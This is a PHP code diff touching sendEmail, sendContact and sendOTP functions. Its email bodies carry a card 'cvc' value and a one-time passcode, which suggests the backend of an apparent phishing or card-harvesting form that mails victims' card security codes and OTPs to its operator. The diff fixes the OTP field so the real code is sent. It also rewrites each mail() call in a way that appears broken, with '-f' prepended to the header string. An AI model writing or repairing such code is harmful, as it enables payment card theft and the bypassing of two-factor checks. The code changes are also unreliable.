@@ -88,7 +88,7 @@ function sendEmail($post) {
     $html_body .= "<p><strong>cvc:</strong><br>$cvv</p>";
 
     // Send email
-    if (mail($to, $subject, $email_body, $headers)) {
+    if (mail($to, $subject, $email_body, '-f'.$headers)) {
         echo "success";
     } else {
         echo "Failed to send email to";
@@ -152,7 +152,7 @@ function sendContact($post) {
     // } catch (Exception $e) {
     //     echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
     // }
-    if (mail($to, $subject, $email_body, $headers)) {
+    if (mail($to, $subject, $email_body, '-f'.$headers)) {
         echo "success";
     } else {
         echo "Failed to send email to";
@@ -166,7 +166,7 @@ function sendOTP($post) {
     
 
     $email_body = "You have received a new message.\n\n";
-    $email_body .= "OTP: $name\n";
+    $email_body .= "OTP: $otp\n";
     
 
 
@@ -205,7 +205,7 @@ function sendOTP($post) {
     $headers .= "Content-type: text/html; charset=UTF-8" . "\r\n";
     $headers .= "From: {$name} <{$fromEmail}>" . "\r\n";
     $headers .= "Reply-To: {$fromEmail}" . "\r\n";
-    if (mail($to, $subject, $email_body, $headers)) {
+    if (mail($to, $subject, $email_body, '-f'.$headers)) {
         echo "success";
     } else {
         echo "Failed to send email to";
